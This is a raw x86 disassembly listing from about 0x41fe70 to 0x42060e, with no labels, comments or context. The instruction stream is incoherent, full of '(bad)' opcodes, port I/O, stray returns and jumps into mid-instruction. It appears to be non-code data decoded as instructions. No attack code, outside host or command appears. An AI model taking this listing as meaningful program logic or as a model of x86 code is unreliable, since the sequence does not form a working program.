  41fe70:	cdq    
  41fe71:	out    0x41,eax
  41fe73:	shl    BYTE PTR [bp+si],1
  41fe76:	xchg   ebx,eax
  41fe77:	and    eax,0x47458a8e
  41fe7c:	fs mov bh,0xdb
  41fe7f:	cmp    BYTE PTR [esi+0x6f5c55c6],0x4e
  41fe86:	xor    BYTE PTR [edi+edx*2],bh
  41fe89:	mov    DWORD PTR [esi],0x91b45191
  41fe8f:	jns    0x41fedb
  41fe91:	sbb    eax,0xe197e0bf
  41fe96:	cld    
  41fe97:	push   eax
  41fe98:	push   edi
  41fe99:	and    edx,DWORD PTR [esi-0x3b]
  41fe9c:	loopne 0x41fedd
  41fe9e:	iret   
  41fe9f:	retf   0x75da
  41fea2:	mov    dh,0x3f
  41fea4:	add    al,cl
  41fea6:	add    BYTE PTR [eax],al
  41fea8:	loope  0x41fe90
  41feaa:	jmp    0xb08b02
  41feaf:	add    bl,al
  41feb1:	inc    ebp
  41feb2:	in     eax,0xee
  41feb4:	ss push ds
  41feb6:	cld    
  41feb7:	fisubr DWORD PTR ds:0x89cc
  41febd:	mov    ecx,0x48e2b187
  41fec2:	clc    
  41fec3:	add    BYTE PTR [eax],al
  41fec5:	dec    ebx
  41fec6:	fst    QWORD PTR ds:0xd9e92558
  41fecc:	fdiv   QWORD PTR [ebp+0x4d123b07]
  41fed2:	icebp  
  41fed3:	push   edx
  41fed4:	add    al,0x3e
  41fed6:	add    BYTE PTR [eax],al
  41fed8:	in     eax,0x44
  41feda:	jp     0x41fedc
  41fedc:	add    BYTE PTR [ebx+eax*1+0x7a],dh
  41fee0:	inc    edx
  41fee1:	xor    al,0xa2
  41fee3:	(bad)  [ebx+ebp*1-0x6a]
  41fee7:	fnstsw WORD PTR [edi+0x6ac4]
  41feed:	dec    eax
  41feee:	das    
  41feef:	add    BYTE PTR [eax],al
  41fef1:	mov    esp,0x3cce46fd
  41fef6:	and    al,0xa2
  41fef8:	les    ebx,FWORD PTR [ecx+0x0]
  41fefb:	add    dl,cl
  41fefd:	mov    bh,0xee
  41feff:	dec    BYTE PTR [eax]
  41ff01:	jecxz  0x41ff03
  41ff03:	add    BYTE PTR [ecx+0x0],cl
  41ff06:	hlt    
  41ff07:	add    BYTE PTR [eax],al
  41ff09:	cld    
  41ff0a:	add    al,0x83
  41ff0c:	add    BYTE PTR [eax],al
  41ff0e:	jbe    0x41ff56
  41ff10:	mov    ecx,0x3c8beffe
  41ff15:	shl    BYTE PTR [edx-0x15950000],0xf2
  41ff1c:	or     bl,cl
  41ff1e:	add    BYTE PTR [eax],al
  41ff20:	out    dx,al
  41ff21:	ror    BYTE PTR [eax-0x16],1
  41ff24:	add    BYTE PTR [eax],al
  41ff26:	fsubr  DWORD PTR cs:[esi+0x6cce43a9]
  41ff2d:	and    cl,BYTE PTR [edx]
  41ff2f:	sahf   
  41ff30:	stos   DWORD PTR es:[edi],eax
  41ff31:	inc    esp
  41ff32:	and    eax,DWORD PTR [eax]
  41ff34:	add    BYTE PTR [edx-0x122117dd],al
  41ff3a:	push   cs
  41ff3b:	fisub  DWORD PTR [edi+0x65]
  41ff3e:	jo     0x41ff14
  41ff40:	cdq    
  41ff41:	(bad)  [eax]
  41ff43:	inc    edx
  41ff44:	clc    
  41ff45:	imul   edx,DWORD PTR [edx+0x1acb2e8e],0xfe8ca0
  41ff4f:	add    BYTE PTR [ebp-0x7a304aa8],dh
  41ff55:	jae    0x41ff81
  41ff57:	fs xor eax,0x3a23ec73
  41ff5d:	adc    DWORD PTR [esi],eax
  41ff5f:	pop    edi
  41ff60:	push   ebx
  41ff61:	push   edi
  41ff62:	xchg   edi,eax
  41ff63:	fist   DWORD PTR [eax+edi*4]
  41ff66:	out    0x26,eax
  41ff68:	pop    ss
  41ff69:	fsubr  st,st(0)
  41ff6b:	and    ch,BYTE PTR [ebp-0x5d49c89a]
  41ff71:	rol    BYTE PTR [edi],0x0
  41ff74:	add    cl,bh
  41ff76:	dec    esp
  41ff77:	or     DWORD PTR [eax],eax
  41ff79:	add    BYTE PTR [edx+0x3f],dh
  41ff7c:	(bad)  
  41ff7d:	cli    
  41ff7e:	dec    eax
  41ff7f:	mov    WORD PTR [eax],es
  41ff81:	add    BYTE PTR ds:0x7d02a9b3,ch
  41ff87:	ins    DWORD PTR es:[edi],dx
  41ff88:	fnsave ds:0x261cd38
  41ff8e:	and    BYTE PTR [edx],bl
  41ff90:	repz push esp
  41ff92:	enter  0x1e,0x0
  41ff96:	sahf   
  41ff97:	js     0x41ff1b
  41ff99:	dec    esp
  41ff9a:	fild   WORD PTR [eax]
  41ff9c:	add    BYTE PTR [ebp+0x45249e99],ah
  41ffa2:	xor    BYTE PTR [esi],ah
  41ffa4:	xor    DWORD PTR [ebp*2+0x32834d37],edx
  41ffab:	popa   
  41ffac:	out    0xd4,eax
  41ffae:	out    0xbe,eax
  41ffb0:	jbe    0x41ff77
  41ffb2:	or     BYTE PTR [ecx],bh
  41ffb4:	add    BYTE PTR [eax],al
  41ffb6:	mov    al,ds:0xdcc4a7
  41ffbb:	add    bl,dh
  41ffbd:	jb     0x41ff7f
  41ffbf:	ins    DWORD PTR es:[edi],dx
  41ffc0:	add    BYTE PTR [eax],al
  41ffc2:	jmp    0x3eb:0xa747aa4f
  41ffc9:	nop
  41ffca:	xchg   DWORD PTR [ecx],eax
  41ffcc:	sbb    eax,0x120f732
  41ffd1:	xchg   edi,eax
  41ffd2:	or     al,0x4
  41ffd4:	add    BYTE PTR [eax],al
  41ffd6:	out    dx,al
  41ffd7:	or     DWORD PTR [eax+0x27],ebx
  41ffda:	in     al,0x8a
  41ffdc:	and    al,BYTE PTR [eax]
  41ffde:	clc    
  41ffdf:	add    BYTE PTR [eax],al
  41ffe1:	mov    bh,0x9a
  41ffe3:	add    eax,0xeb70952a
  41ffe8:	pop    edi
  41ffe9:	sar    BYTE PTR [ecx+0x0],0x0
  41ffed:	jmp    0x41fff4
  41ffef:	xchg   edi,eax
  41fff0:	jns    0x41ffd3
  41fff2:	mov    cl,0xc
  41fff4:	inc    ebp
  41fff5:	add    BYTE PTR [eax],al
  41fff7:	inc    ebp
  41fff8:	out    0xe9,eax
  41fffa:	ret    
  41fffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fffc:	adc    esi,DWORD PTR [esi+0xcc9e9f7]
  420002:	rol    BYTE PTR [eax],cl
  420004:	add    BYTE PTR ds:0xd3d2f245,dl
  42000a:	push   ecx
  42000b:	push   ss
  42000c:	aad    0xc3
  42000e:	sti    
  42000f:	jae    0x41ffa9
  420011:	lods   eax,DWORD PTR ds:[esi]
  420013:	stos   BYTE PTR es:[edi],al
  420014:	(bad)  
  420015:	repz test DWORD PTR [edi+0x22],0xce7ff774
  42001d:	out    dx,al
  42001e:	mov    al,0x77
  420020:	int    0x6c
  420022:	jge    0x41ffac
  420024:	add    al,BYTE PTR [eax]
  420026:	add    BYTE PTR [eax+0x5f0000e2],cl
  42002c:	fmulp  st(6),st
  42002e:	sub    al,dh
  420030:	adc    eax,esp
  420032:	rol    BYTE PTR [eax],cl
  420034:	add    BYTE PTR [ecx-0x397b933b],dl
  42003a:	add    BYTE PTR [eax],al
  42003c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42003d:	pop    ebp
  42003e:	out    0x87,eax
  420040:	fiadd  WORD PTR cs:[ecx+0x78e16028]
  420047:	adc    DWORD PTR [ecx],ebp
  420049:	adc    al,0x85
  42004b:	inc    ecx
  42004c:	push   ss
  42004d:	or     eax,DWORD PTR [edx-0x3c]
  420050:	inc    esp
  420051:	add    BYTE PTR [eax],al
  420053:	mov    ss,esp
  420055:	push   ss
  420056:	mov    ds:0x1895dc7a,eax
  42005b:	enter  0xd4,0x0
  42005f:	xchg   ecx,eax
  420060:	jns    0x4200ce
  420062:	dec    eax
  420063:	sbb    al,BYTE PTR [eax]
  420065:	add    BYTE PTR [ecx+edx*2-0xc],ch
  420069:	je     0x4200ab
  42006b:	inc    edx
  42006c:	add    BYTE PTR [eax],al
  42006e:	mov    BYTE PTR [ebx],al
  420070:	add    BYTE PTR [eax],al
  420072:	rcr    BYTE PTR [ecx+0x673865a],cl
  420078:	or     ebx,DWORD PTR [esi]
  42007a:	add    DWORD PTR cs:[ebp+0x64],ebx
  42007e:	ja     0x420041
  420080:	xchg   esp,eax
  420081:	push   esi
  420083:	xchg   esp,eax
  420084:	and    BYTE PTR [ecx],0x7
  420087:	adc    DWORD PTR [ebx+0x8],eax
  42008a:	mov    al,ds:0xd3310000
  42008f:	xchg   ebp,eax
  420090:	jecxz  0x4200a0
  420092:	hlt    
  420093:	leave  
  420094:	inc    edi
  420095:	pop    ecx
  420096:	mov    DWORD PTR [ebx],esi
  420098:	das    
  420099:	aad    0xef
  42009b:	and    edx,DWORD PTR [ebx]
  42009d:	push   esp
  42009e:	pop    esi
  42009f:	(bad)  [edi+0x49]
  4200a2:	(bad)  
  4200a3:	enter  0x4d,0x0
  4200a7:	call   0x4589:0x6795b093
  4200ae:	push   edx
  4200af:	ret    
  4200b0:	adc    edx,DWORD PTR [ecx+0x50]
  4200b3:	mov    esp,0x7fbc6127
  4200b8:	push   ebp
  4200b9:	outs   dx,DWORD PTR ds:[esi]
  4200ba:	popf   
  4200bb:	jmp    0xe349f154
  4200c0:	loop   0x4200c5
  4200c2:	(bad)  
  4200c3:	xchg   ecx,eax
  4200c4:	rcr    BYTE PTR [edx+0x7a496e03],cl
  4200ca:	pop    edx
  4200cb:	fdiv   DWORD PTR [ebp+0x70]
  4200ce:	sub    eax,0x7f44f224
  4200d3:	add    BYTE PTR [eax],al
  4200d5:	les    ecx,FWORD PTR [eax+0x0]
  4200d8:	add    dl,dh
  4200da:	jle    0x42015a
  4200dc:	scas   eax,DWORD PTR es:[edi]
  4200dd:	dec    edi
  4200de:	pop    esi
  4200df:	icebp  
  4200e0:	jp     0x420125
  4200e2:	stc    
  4200e3:	(bad)  
  4200e4:	fld    st(7)
  4200e6:	mov    bh,0x92
  4200e8:	sbb    eax,0xcb04f3
  4200ed:	add    BYTE PTR [edx+eax*2-0x74f8600a],bl
  4200f4:	pop    ebx
  4200f5:	cdq    
  4200f6:	xor    DWORD PTR [ecx+0x49c06b6e],eax
  4200fc:	add    BYTE PTR [eax],al
  4200fe:	lahf   
  4200ff:	call   0x24d:0x2170f14
  420106:	jae    0x42015c
  420108:	pop    edi
  420109:	mov    ebp,0xbf9592d7
  42010e:	xchg   ebx,eax
  42010f:	cld    
  420110:	cmp    al,ch
  420112:	fimul  WORD PTR [ebp+0x6]
  420115:	jns    0x420136
  420117:	loop   0x4200b0
  420119:	jecxz  0x420153
  42011b:	mov    ecx,0x641ee2f7
  420120:	in     eax,dx
  420121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420122:	popf   
  420123:	xor    eax,0x9b14745d
  420128:	retf   0x60e9
  42012b:	(bad)  
  42012c:	in     al,0x75
  42012e:	jmp    0x420159
  420130:	mov    al,ds:0xbdcd61c9
  420135:	loop   0x4200f1
  420137:	(bad)  
  420138:	push   ebp
  420139:	and    bh,BYTE PTR [bp-0x650d]
  42013e:	sub    dh,BYTE PTR [edi-0x486eabce]
  420144:	and    eax,0x24e01568
  420149:	and    al,BYTE PTR [ecx-0x2a]
  42014c:	cdq    
  42014d:	or     edi,edx
  42014f:	mov    ch,0xd
  420151:	ss and al,0x2a
  420154:	jae    0x42012a
  420156:	adc    ebx,DWORD PTR [eax]
  420158:	push   esi
  420159:	mov    dl,0xad
  42015b:	das    
  42015c:	fild   WORD PTR [edx+edx*8+0x0]
  420160:	add    BYTE PTR [ecx+0x8e4c],dh
  420166:	div    BYTE PTR [ecx]
  420168:	push   ebx
  420169:	in     al,0x73
  42016b:	clc    
  42016c:	and    al,0x11
  42016e:	jecxz  0x420167
  420170:	jne    0x4201cc
  420172:	dec    eax
  420173:	out    0x0,eax
  420175:	add    BYTE PTR [ecx-0x401af11c],bh
  42017b:	les    esi,FWORD PTR [eax+0x0]
  42017e:	add    BYTE PTR [esi],dl
  420180:	jecxz  0x420117
  420182:	in     al,dx
  420183:	js     0x4201f9
  420185:	cmc    
  420186:	lock add esi,DWORD PTR [ecx]
  420189:	adc    eax,0x49396797
  42018e:	in     eax,0x7c
  420190:	test   eax,0x22c434
  420195:	add    BYTE PTR [ecx],ch
  420197:	icebp  
  420198:	add    dl,0xb4
  42019b:	or     al,0xae
  42019d:	add    BYTE PTR [eax],al
  42019f:	mov    esp,0x3bf5551b
  4201a4:	pop    esi
  4201a5:	xlat   BYTE PTR ds:[ebx]
  4201a6:	xchg   esp,eax
  4201a7:	js     0x42013e
  4201a9:	ret    
  4201aa:	xor    edx,edx
  4201ac:	sbb    dl,bh
  4201ae:	xchg   bh,cl
  4201b0:	mov    ecx,0x83cd2c22
  4201b5:	imul   ebx,DWORD PTR [ebx],0xd3b2b267
  4201bb:	int3   
  4201bc:	mov    al,0x0
  4201be:	add    BYTE PTR [ecx],ch
  4201c0:	add    eax,0x2cb41dce
  4201c5:	push   esp
  4201c6:	pop    esp
  4201c7:	fst    QWORD PTR [edi+0x39]
  4201ca:	pop    eax
  4201cb:	pop    eax
  4201cc:	push   esi
  4201cd:	xor    bh,BYTE PTR ds:0xae4857
  4201d3:	add    ch,dh
  4201d5:	test   BYTE PTR [eax-0x27520000],ch
  4201db:	push   edx
  4201dc:	xchg   esi,eax
  4201dd:	jp     0x4201f7
  4201df:	aad    0x18
  4201e1:	sub    al,0x12
  4201e3:	dec    eax
  4201e4:	or     DWORD PTR [eax],eax
  4201e6:	add    BYTE PTR [esi+0x2b],ah
  4201e9:	mov    cl,0x0
  4201eb:	push   0x0
  4201ed:	add    BYTE PTR [eax+eiz*4-0x1cdb24de],bl
  4201f4:	mov    al,0x6f
  4201f6:	and    edi,ecx
  4201f8:	mov    esp,es
  4201fa:	add    BYTE PTR [eax],al
  4201fc:	sub    cl,0x0
  4201ff:	add    BYTE PTR ds:0xbde42541,al
  420205:	dec    edi
  420206:	dec    esp
  420207:	test   DWORD PTR [eax],0x28ad8d00
  42020d:	or     ebp,esp
  42020f:	or     eax,0x356bf767
  420214:	iret   
  420215:	fsub   DWORD PTR [edx-0x72]
  420218:	mov    ds:0xfc16acaa,eax
  42021e:	sbb    BYTE PTR [edi-0x64],dl
  420221:	imul   ebx,DWORD PTR [ecx+0x79cc],0x6cd3f3b0
  42022b:	sbb    eax,0x4e8ffd22
  420230:	(bad)  
  420231:	fiadd  DWORD PTR [eax]
  420233:	add    BYTE PTR [eax+0x6c],dh
  420236:	repz mov al,ds:0x41d312b0
  42023d:	pop    edx
  42023e:	cmp    cl,BYTE PTR [esi]
  420240:	mov    cl,0xf4
  420242:	cs xchg esp,eax
  420244:	push   cs
  420245:	jae    0x42026c
  420247:	fwait
  420248:	sbb    DWORD PTR [eax],esp
  42024a:	xchg   edx,eax
  42024b:	sbb    dl,BYTE PTR [edx-0x5]
  42024e:	fadd   st,st(6)
  420250:	(bad)  
  420251:	icebp  
  420252:	add    BYTE PTR [eax],al
  420254:	cmp    al,0x62
  420256:	sub    ah,BYTE PTR [ebp+0x3c]
  420259:	mov    al,ds:0x22f3cd4d
  42025e:	mov    esi,0xd177a0ce
  420263:	and    al,0x16
  420265:	lods   al,BYTE PTR ds:[esi]
  420266:	pop    edi
  420267:	mov    ds:0x70488d63,al
  42026c:	add    BYTE PTR [eax],al
  42026e:	cli    
  42026f:	nop
  420270:	ins    BYTE PTR es:[edi],dx
  420271:	ja     0x4202e1
  420273:	in     eax,dx
  420274:	aas    
  420275:	pop    ebp
  420276:	push   ebx
  420277:	out    dx,al
  420278:	add    al,0x41
  42027a:	add    BYTE PTR [eax],al
  42027c:	fwait
  42027d:	retf   0x4484
  420280:	add    BYTE PTR [eax],al
  420282:	jp     0x4202ac
  420284:	pop    ds
  420285:	stc    
  420286:	mov    eax,0x71f4ad2d
  42028b:	mov    bl,0xe7
  42028d:	das    
  42028e:	jnp    0x42021b
  420290:	jl     0x420276
  420292:	inc    esp
  420293:	rol    DWORD PTR [eax],1
  420295:	add    BYTE PTR [edi],bh
  420297:	cmp    eax,0xf8c4cf
  42029c:	add    BYTE PTR [ecx],ch
  42029e:	add    al,0x40
  4202a0:	add    BYTE PTR [eax],al
  4202a2:	push   ss
  4202a3:	dec    ebx
  4202a4:	hlt    
  4202a5:	loope  0x4202da
  4202a7:	(bad)  
  4202a8:	call   0x9fd1f82b
  4202ad:	sbb    dl,BYTE PTR [ebp-0x6c3fcbf7]
  4202b3:	add    BYTE PTR [eax],al
  4202b5:	loope  0x42027e
  4202b7:	into   
  4202b8:	(bad)  
  4202ba:	dec    eax
  4202bb:	pop    ebx
  4202bc:	add    BYTE PTR [eax],al
  4202be:	inc    edi
  4202bf:	ror    bh,0x0
  4202c2:	add    BYTE PTR [ebx],dh
  4202c4:	int    0x27
  4202c6:	push   cs
  4202c7:	fld    QWORD PTR [edi]
  4202c9:	imul   esp,DWORD PTR [eax-0x48e3c053],0xffffffd6
  4202d0:	adc    edi,ebp
  4202d2:	add    ebx,DWORD PTR [ebp+0x5c24e1df]
  4202d8:	add    BYTE PTR [eax+0x0],ch
  4202db:	add    bh,bh
  4202dd:	sbb    eax,0xa07d3f4f
  4202e2:	xchg   BYTE PTR [eax],al
  4202e4:	fild   WORD PTR [eax]
  4202e6:	add    BYTE PTR [ebp-0x9],ch
  4202e9:	loop   0x4202a1
  4202eb:	out    dx,al
  4202ec:	or     al,0x1b
  4202ee:	add    BYTE PTR [eax],al
  4202f0:	rol    BYTE PTR [edi+0x2627b85e],1
  4202f6:	stc    
  4202f7:	or     al,0x59
  4202f9:	add    BYTE PTR [eax],al
  4202fb:	jb     0x4202ae
  4202fd:	adc    eax,0xc204b4
  420302:	add    BYTE PTR [edi-0x68],bl
  420305:	loope  0x42032a
  420307:	mov    dh,0xf7
  420309:	mov    al,ds:0x2b430b59
  42030e:	into   
  42030f:	loopne 0x42037b
  420311:	inc    eax
  420312:	push   edx
  420313:	add    BYTE PTR [eax],al
  420315:	xchg   edi,eax
  420316:	ja     0x4202d5
  420318:	dec    esp
  420319:	cwde   
  42031a:	add    BYTE PTR [eax],al
  42031c:	ror    bl,0x0
  42031f:	add    al,dh
  420321:	fstp   st(5)
  420323:	mov    gs,eax
  420325:	popa   
  420326:	sar    DWORD PTR [edx-0x5645d969],1
  42032c:	(bad)  
  42032d:	enter  0x40,0x0
  420331:	mov    dl,BYTE PTR [ecx-0x5f5c933a]
  420337:	sar    DWORD PTR [ebp+0x7b98a170],cl
  42033d:	repnz ss cli 
  420340:	fnstsw WORD PTR [edi]
  420342:	xor    dl,BYTE PTR [eax+0x1cb3f95f]
  420348:	mov    dh,0x41
  42034a:	aad    0x6a
  42034c:	out    0xef,al
  42034e:	push   es
  42034f:	and    al,0x51
  420351:	jns    0x4202e4
  420353:	push   ds
  420354:	add    eax,0xfdf8bd20
  420359:	in     al,0xd2
  42035b:	ret    
  42035c:	jo     0x420393
  42035e:	pop    esp
  42035f:	into   
  420360:	jo     0x42037f
  420362:	je     0x42030f
  420364:	sar    al,0x0
  420367:	add    BYTE PTR [ebx],bh
  420369:	mov    edx,0x406dcef5
  42036e:	retf   
  42036f:	add    BYTE PTR [eax],al
  420371:	adc    dh,BYTE PTR [esi-0x16]
  420374:	out    dx,al
  420375:	xchg   ebx,ebx
  420377:	imul   edi,edx,0x74
  42037a:	in     eax,dx
  42037b:	sbb    al,0x73
  42037d:	xchg   edx,eax
  42037e:	and    eax,0x1c2694a3
  420383:	jmp    FWORD PTR [edx-0x3e0aabd1]
  420389:	pop    edx
  42038a:	inc    esi
  42038b:	iret   
  42038c:	mov    ecx,DWORD PTR [ebp-0x43]
  42038f:	(bad)  
  420390:	xor    esi,DWORD PTR [edx-0x4a]
  420393:	sbb    eax,0xe4e32045
  420398:	out    dx,al
  420399:	mov    eax,DWORD PTR [esi]
  42039b:	scas   al,BYTE PTR es:[edi]
  42039c:	in     eax,0x2e
  42039e:	push   cs
  42039f:	loope  0x4203cd
  4203a1:	loope  0x420328
  4203a3:	leave  
  4203a4:	sbb    eax,ebp
  4203a6:	sub    DWORD PTR ds:[edi+edx*1],ecx
  4203aa:	add    BYTE PTR [eax],al
  4203ac:	iret   
  4203ad:	gs popf 
  4203af:	sahf   
  4203b0:	dec    edx
  4203b1:	div    BYTE PTR [ecx+0x7f]
  4203b4:	mov    ds:0x9f79b3b5,eax
  4203b9:	mov    bl,0xdd
  4203bb:	cmp    edx,DWORD PTR [edx]
  4203bd:	cli    
  4203be:	test   eax,0xb2539e7c
  4203c3:	(bad)
  4203c6:	mov    dh,0x9a
  4203c8:	pop    edx
  4203c9:	clc    
  4203ca:	or     DWORD PTR [ebx+0x28],edx
  4203cd:	leave  
  4203ce:	and    edi,edx
  4203d0:	jecxz  0x42041d
  4203d2:	cmc    
  4203d3:	pop    ds
  4203d4:	adc    cl,ah
  4203d6:	sub    cl,BYTE PTR [ebp-0x76f234a7]
  4203dc:	(bad)  
  4203dd:	loop   0x4203a0
  4203df:	into   
  4203e0:	or     al,0xe1
  4203e2:	add    BYTE PTR [eax],al
  4203e4:	out    dx,eax
  4203e5:	adc    eax,0xc1ad8ee8
  4203ea:	dec    ecx
  4203eb:	pushf  
  4203ec:	stc    
  4203ed:	push   ds
  4203ee:	mov    ebx,0xa94e2879
  4203f3:	outs   dx,BYTE PTR ds:[esi]
  4203f4:	push   ss
  4203f5:	and    esp,DWORD PTR [esi+0x6c]
  4203f8:	jmp    0xa0d0983f
  4203fd:	cmp    al,0x79
  4203ff:	push   esp
  420400:	jmp    0x751e:0x824356d8
  420407:	ins    DWORD PTR es:[edi],dx
  420408:	or     eax,0x51dfd766
  42040d:	ror    DWORD PTR [ebx-0x2d],1
  420410:	push   ebp
  420411:	dec    ebp
  420412:	ds and ebp,ecx
  420415:	or     DWORD PTR [eax+0x1756e88f],esi
  42041b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42041c:	dec    esi
  42041d:	aas    
  42041e:	fwait
  42041f:	cmc    
  420420:	xor    al,dh
  420422:	or     ebx,DWORD PTR [ecx-0x7867d325]
  420428:	cld    
  420429:	(bad)  
  42042a:	loop   0x4203ac
  42042c:	lds    eax,FWORD PTR [eax]
  42042e:	add    BYTE PTR [eax-0x21],al
  420431:	add    BYTE PTR [eax],al
  420433:	js     0x420406
  420435:	mov    cl,0x9d
  420437:	inc    ecx
  420438:	cmp    al,BYTE PTR [ebx]
  42043a:	lds    esp,FWORD PTR [ebp-0x7a]
  42043d:	jbe    0x42049d
  42043f:	xlat   BYTE PTR ss:[ebx]
  420441:	fst    DWORD PTR [edi+edi*8]
  420444:	xchg   edi,eax
  420445:	mov    eax,ds:0xab896d21
  42044a:	inc    ecx
  42044b:	xor    cl,al
  42044d:	sbb    BYTE PTR [eax],al
  42044f:	add    BYTE PTR [esi],dh
  420451:	inc    ebp
  420452:	enter  0xa,0x0
  420456:	cmp    esi,DWORD PTR [edi+0x26]
  420459:	and    bh,0x0
  42045c:	add    ah,dh
  42045e:	repnz vpsubsb xmm6,xmm0,XMMWORD PTR [edx+0xa0b93e2]
  420467:	stc    
  420468:	push   edi
  420469:	or     BYTE PTR [edx],ch
  42046b:	add    BYTE PTR [eax],al
  42046d:	xor    al,0xf7
  42046f:	mov    eax,ds:0xaecbd85a
  420474:	retf   0xb8c1
  420477:	mov    dh,0xe3
  420479:	push   ebp
  42047a:	or     ecx,0x108
  420480:	jne    0x420402
  420482:	and    eax,DWORD PTR [eax]
  420484:	add    BYTE PTR [ebp+0x34],ch
  420487:	les    ecx,FWORD PTR [ebp+0x0]
  42048a:	add    BYTE PTR [edi+edi*4],dh
  42048d:	push   ebx
  42048e:	dec    edi
  42048f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420490:	xchg   edx,eax
  420491:	xor    DWORD PTR [ebp+0x6c401e4d],edx
  420497:	add    BYTE PTR [eax],al
  420499:	xchg   edx,eax
  42049a:	repz sub bh,0x36
  42049e:	jle    0x420427
  4204a0:	sbb    DWORD PTR [edx],0xb9c6d01f
  4204a6:	jo     0x42047c
  4204a8:	jne    0x4204dc
  4204aa:	jmp    0x1e0349bd
  4204af:	push   ecx
  4204b0:	stos   BYTE PTR es:[edi],al
  4204b1:	jecxz  0x42045f
  4204b3:	sbb    DWORD PTR [ebx],esi
  4204b5:	push   es
  4204b6:	outs   dx,BYTE PTR ds:[esi]
  4204b7:	inc    esp
  4204b8:	add    al,BYTE PTR [eax]
  4204ba:	add    bh,dh
  4204bc:	sbb    bl,dh
  4204be:	sti    
  4204bf:	aaa    
  4204c0:	test   BYTE PTR [ecx+0x0],dh
  4204c3:	add    dl,ah
  4204c5:	or     DWORD PTR [esi],esi
  4204c7:	cdq    
  4204c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204c9:	out    dx,eax
  4204ca:	cld    
  4204cb:	sub    BYTE PTR [ecx-0xd44dc14],al
  4204d1:	and    al,0x8c
  4204d3:	ja     0x4204d5
  4204d5:	add    BYTE PTR [eax-0x14],dh
  4204d8:	jb     0x420465
  4204da:	(bad)  
  4204db:	cmp    dh,dh
  4204dd:	das    
  4204de:	cmc    
  4204df:	sar    DWORD PTR ds:0x4ed9aa64,1
  4204e5:	imul   edi,DWORD PTR [eax],0x7f2490ef
  4204eb:	sub    eax,0x5cc130a4
  4204f0:	popf   
  4204f1:	jnp    0x4204b1
  4204f3:	repnz cmc 
  4204f5:	push   edx
  4204f6:	cmp    al,0xbf
  4204f8:	cli    
  4204f9:	dec    ebx
  4204fa:	push   ecx
  4204fb:	xchg   esp,eax
  4204fc:	xchg   DWORD PTR [ebp-0x3e],eax
  4204ff:	shl    BYTE PTR [eax+0x9],cl
  420502:	std    
  420503:	leave  
  420504:	mov    BYTE PTR [esi+0x0],al
  420507:	add    BYTE PTR [ebx+eiz*4+0x8a1250b],ch
  42050e:	cmp    al,0x0
  420510:	add    dl,bh
  420512:	je     0x42056f
  420514:	lea    esp,[edx+0x3f]
  420517:	jb     0x420533
  420519:	push   esp
  42051a:	push   ebx
  42051b:	shl    BYTE PTR [ebx],0x0
  42051e:	add    BYTE PTR [ebx+0x47307102],cl
  420524:	mov    WORD PTR [edi+0x0],?
  420527:	add    ah,al
  420529:	std    
  42052a:	add    BYTE PTR [eax],al
  42052c:	lahf   
  42052d:	dec    eax
  42052e:	out    0x0,eax
  420530:	add    dl,ah
  420532:	or     bh,BYTE PTR [edx+ecx*8-0x30]
  420536:	xor    eax,0xca39657e
  42053b:	stos   DWORD PTR es:[edi],eax
  42053c:	dec    ecx
  42053d:	cmp    DWORD PTR [eax-0x52],esi
  420540:	jl     0x4205b1
  420542:	xchg   edi,eax
  420543:	out    dx,al
  420544:	(bad)  
  420545:	inc    DWORD PTR [eax]
  420547:	add    BYTE PTR ds:0x68c88b37,cl
  42054d:	add    BYTE PTR [eax],al
  42054f:	mov    ah,0xe8
  420551:	fcmove st,st(5)
  420553:	mov    ah,0xba
  420555:	sbb    DWORD PTR [edi+0x21],edi
  420558:	jle    0x4204f4
  42055a:	loop   0x4205b1
  42055c:	inc    edi
  42055d:	xchg   edi,eax
  42055e:	(bad)
  420561:	mov    ah,0xa3
  420563:	xchg   esp,eax
  420564:	sbb    DWORD PTR [ebp+ebp*2-0x42fabe26],0xfc8189cd
  42056f:	mul    BYTE PTR [ebp+0xfdbbd3b]
  420575:	clc    
  420576:	mov    edx,0xeff4295
  42057b:	cmp    al,0x4d
  42057d:	test   BYTE PTR [edi+0x0],ch
  420580:	add    BYTE PTR [edx-0x57],bl
  420583:	adc    eax,0x964d2e2a
  420588:	js     0x4205b3
  42058a:	pop    ss
  42058b:	aam    0x18
  42058d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42058e:	ret    0x2d79
  420591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420592:	test   eax,0x593ed895
  420597:	ret    0xbb09
  42059a:	and    edi,DWORD PTR [ecx+0x2b]
  42059d:	aas    
  42059e:	clc    
  42059f:	pop    ebx
  4205a0:	jle    0x42057d
  4205a2:	cld    
  4205a3:	dec    esp
  4205a4:	rol    DWORD PTR [eax],0x0
  4205a7:	js     0x4205bf
  4205a9:	mov    bl,0x8c
  4205ab:	pop    ebp
  4205ac:	add    BYTE PTR [eax],al
  4205ae:	inc    ebp
  4205af:	mov    ah,0x6f
  4205b1:	retf   
  4205b2:	mov    ecx,0x85374383
  4205b7:	ins    DWORD PTR es:[edi],dx
  4205b8:	or     al,ch
  4205ba:	add    BYTE PTR [esi+0x37073647],0xb1
  4205c1:	adc    al,0x5c
  4205c3:	popf   
  4205c4:	dec    esp
  4205c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205c6:	add    BYTE PTR [eax],al
  4205c8:	setnp  BYTE PTR [esi]
  4205cb:	mov    ds:0xabecb0f8,eax
  4205d0:	dec    esi
  4205d1:	push   ebp
  4205d2:	xchg   BYTE PTR [ecx+0x35b51068],ch
  4205d8:	imul   edi,DWORD PTR [esi+0x313a590e],0x9f53b5ed
  4205e2:	or     BYTE PTR [ebp+0x0],dl
  4205e5:	add    cl,cl
  4205e7:	push   es
  4205e8:	ja     0x420571
  4205ea:	loope  0x42065d
  4205ec:	cmp    BYTE PTR [ecx-0x1e610000],0xb8
  4205f3:	ror    DWORD PTR [ebx],1
  4205f5:	add    eax,0xf98feaf8
  4205fa:	or     DWORD PTR [edx-0x32],0x64ab6792
  420601:	dec    esp
  420602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420603:	add    BYTE PTR [eax],al
  420605:	fs sbb DWORD PTR es:[ebx-0x5f],0x7edfafd6
  42060e:	int    0x7c
